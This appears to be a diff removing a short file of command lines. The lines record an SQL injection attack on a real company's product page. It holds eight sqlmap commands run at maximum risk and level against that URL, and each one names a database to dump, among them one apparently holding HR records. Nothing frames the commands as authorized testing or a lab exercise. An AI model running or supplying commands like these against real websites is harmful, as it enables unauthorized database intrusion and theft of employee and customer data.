@@ -1,9 +1,0 @@
-https://www.trijicon.com/na_en/products/product1.php?id=SRO
-python ../sqlmap/sqlmap.py -u https://www.trijicon.com/na_en/products/product1.php?id=SRO --risk 3 --level 5 --batch -D information schema
-python ../sqlmap/sqlmap.py -u https://www.trijicon.com/na_en/products/product1.php?id=SRO --risk 3 --level 5 --batch -D information_schema
-python ../sqlmap/sqlmap.py -u https://www.trijicon.com/na_en/products/product1.php?id=SRO --risk 3 --level 5 --batch -D trijicon cms p6
-python ../sqlmap/sqlmap.py -u https://www.trijicon.com/na_en/products/product1.php?id=SRO --risk 3 --level 5 --batch -D trijicon hr p
-python ../sqlmap/sqlmap.py -u https://www.trijicon.com/na_en/products/product1.php?id=SRO --risk 3 --level 5 --batch -D trijicon requests p
-python ../sqlmap/sqlmap.py -u https://www.trijicon.com/na_en/products/product1.php?id=SRO --risk 3 --level 5 --batch -D trijicon_cms_p6
-python ../sqlmap/sqlmap.py -u https://www.trijicon.com/na_en/products/product1.php?id=SRO --risk 3 --level 5 --batch -D trijicon_hr_p
-python ../sqlmap/sqlmap.py -u https://www.trijicon.com/na_en/products/product1.php?id=SRO --risk 3 --level 5 --batch -D trijicon_requests_p
